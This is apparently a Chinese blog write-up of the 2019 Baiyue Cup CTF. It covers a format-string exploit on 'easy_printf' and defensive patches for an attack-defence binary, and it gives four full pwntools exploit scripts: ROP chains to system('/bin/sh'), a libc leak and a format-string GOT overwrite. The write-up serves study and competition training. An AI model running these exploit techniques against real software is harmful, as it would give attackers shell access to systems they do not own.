---
title: 19百越杯记录
author: nepire
avatar: /images/title.ico
authorLink: 'https://nepire.github.io/'
authorAbout: 逐梦者
authorDesc: 逐梦者
categories: 技术
comments: true
date: 2019-11-27 23:33:35
tags:
keywords:
description:
photos: /images/cover/4.jpg
---
线下也打完了，虽然结果不尽人意，但还是稍微写写吧

# Online
完美爆0，不愧是我，腐朽了大半年的枯木


## easy_printf
```
nepire@vm:~/CTF/19百越/easy_printf$ checksec easy_printf 
[*]
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
除PIE外全开

简单逆向后发现有个格式化字符串漏洞，但关了标准输出

![图片](obj6AkGLLoktgpXi.png)

第一思路肯定是先把程序构造成环

这里我们想到可以用_dl_fini的那个

![图片](uMJKa8NHaZkvmPvH.png)

由于这时rdx是已经被固定的，所以我们需要操作r12的值

![图片](LlQw4RduetANqLki.png)

实际上对r12的操作是这样的

![图片](14Ryx1gfWQ8NHOaP.png)

然后我们发现一个很神奇的地址

![图片](Ynd5iB9qtAs0gBCV.png)

rbx的值实际在相当深的栈里（个人习惯是只看stack 50）

![图片](ZXmDbyh94Dwp4V7B.png)

所以我们需要往比原先rbx还高的地址写入ret的地址让程序ret回格式化字符串的位置使得能无限利用，这里直接选择往bss段地址去写

![图片](fr0msD93xfE9pbrF.png)

然后就形成了第一个loop

接着我们到第二次格式化字符串的位置，这里再看看

发现能直接改栈循环了

![图片](TpnTRnrCQPwWVxtb.png)

然后就是泄露libc和stack地址出来了，我们很容易就找到下面一点就有栈地址和libc地址

![图片](weWMoeonCE0ilDRZ.png)

泄露出来后就为所欲为了，最简单的就是直接吧ret地址改onegadget然后由于关stdout就用

管道把输出改成2也就是cat flag>&2来getflag

![图片](ddEWIR2jxoEKbsGs.png)


# Final
感觉很适合初学者的ad题目？漏洞之间相对独立，简单的看下题目

## GasSystem
```
nepire@vm:~/CTF/19百越/final$ checksec pwn 
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
### defence
这里能很容易的发现四个能getshell的点

![图片](ujTbi1fRWnot3Vov.png)


![图片](mvy6L4x6mNMdri90.png)

![图片](8Jn9VRzWDIc9ngCD.png)

![图片](RKXWBvVl5xMLyr4y.png)


都很简单，有一个甚至算不上漏洞，直接按程序流执行就能getshell

这里主要分享patch的思路

由于存在三个地方有栈溢出，那么首先得把三个地方的read_size改了

![图片](QnMozBlBioY0DiFa.png)

现在网上大部分的IDA都是吾爱破解的那个版本，所以一般都会自带keypatch，所以直接选中0x100然后ctrl+alt+k来启用keypatch来改数据，这里的两个直接改成size=0x40

而另外的一个根据它对rbp的偏移改成0x30较稳妥

![图片](EjFB2HYdK9YC9ahH.png)

然后就是对eval函数的处理，这里可以改的有两个，挑一个或全改都行

（比赛中不少队改的是这个）

![图片](6ni5tnYB0vwM1GKa.png)

然后就是这个全场修补率最低的格式化字符串？

![图片](CngW3ePiHOUzTx3f.png)

有一说一，这个主办方的check是很松的，只要call printf改call puts就行了，完全不需要考虑\n的问题

### attack
这里攻击方法其实还挺多(?)的，虽然都是简单用法，这里就不一个个细讲了

先是最快的用来前期在patch前偷分的

```python
from pwn import*
import base64
context(os='linux',arch='amd64',log_level='debug')
n = process('./pwn')
elf = ELF('./pwn')
libc = elf.libc
admin_id = base64.b64decode("NzE2NTIyMwo=")
n.recvuntil("id")
n.send(str(admin_id))
n.recvuntil('\xa4\n')
n.sendline("6666")
n.sendline("cat flag")

n.interactive()
```
接着patch先改了了eval里的system函数为其他函数但未改/bin/sh的情况

```python
from pwn import*
import base64
context(os='linux',arch='amd64',log_level='debug')
n = process('./pwn')
elf = ELF('./pwn')
libc = elf.libc
pop_ret = 0x400db3
user_id = base64.b64decode("bmVwaXJl")
n.recvuntil("id")
n.sendline(str(user_id))
n.recvuntil('\x8d\n')
n.sendline("a"*0x38+p64(pop_ret)+p64(0x400E1A)+p64(elf.plt['system']))
n.sendline("cat flag")
n.interactive()
```
接着就是把system和/bin/sh全nop掉的情况

```python
from pwn import*
import base64
context(os='linux',arch='amd64',log_level='debug')
n = process('./pwn')
elf = ELF('./pwn')
libc = elf.libc
pop_ret = 0x400db3
user_id = base64.b64decode("bmVwaXJl")
n.recvuntil('id')
n.sendline(str(user_id))
n.recvuntil('\x8d\n')
payload = 'a'*0x38+p64(pop_ret)+p64(elf.got['puts'])+p64(elf.plt['puts'])+p64(0x400C1E)
n.sendline(payload)
libcbase = u64(n.recvuntil('\x7f')[-6:]+'\x00\x00')-libc.sym['puts']
print hex(libcbase)
system = libcbase + libc.sym['system']
sh = libcbase + libc.search('/bin/sh').next()
n.recvuntil('\x8d\n')
payload = 'a'*0x38+p64(pop_ret)+p64(sh)+p64(system)
n.sendline(payload)
n.sendline("cat flag")
n.interactive()
```
然后是把程序内栈溢出全部patch的情况，这时就是用格式化字符串来打

```python
from pwn import*
import base64
context(os='linux',arch='amd64',log_level='debug')
n = process('./pwn')
elf = ELF('./pwn')
libc = elf.libc
def fmtstr(offset, addr, data, written=0):
	cnt = 0
	payload = ''
	address = ''
	for x in data:
		cur = ord(x)
		if cur >= written&0xff:
			to_add = cur - (written&0xff)
		else:
			to_add = 0x100 + cur - (written&0xff)
		round = ''
		if to_add != 0:
			round += "%{}c".format(to_add)
		round += "%{}$hhn".format(offset+cnt+len(data)*2)
		assert(len(round) <= 0x10)
		written += to_add + 0x10 - len(round)
		payload += round.ljust(0x10, '_')
		address += p64(addr+cnt)
		cnt+=1
	return payload + address

pop_ret = 0x400db3
admin_id = base64.b64decode("NzE2NTIyMwo=")
n.recvuntil('id')
n.send(str(admin_id))
n.recvuntil('\xa4\n')
payload ="%9$p"
n.sendline(payload)
n.recvuntil('0x')
libcbase = int(n.recv(12),16)-0x5f1168
system = libcbase + libc.sym['system']
print hex(libcbase)
one_gadget = libcbase + 0xf1147
offset = 8
payload = fmtstr(offset,elf.got['printf'],p64(system))
n.sendline(payload)
n.sendline("/bin/sh")
n.interactive()
```



#致谢

阮师傅tql，格式化字符串的轮子比fmtstr_payload好用了不是一点点
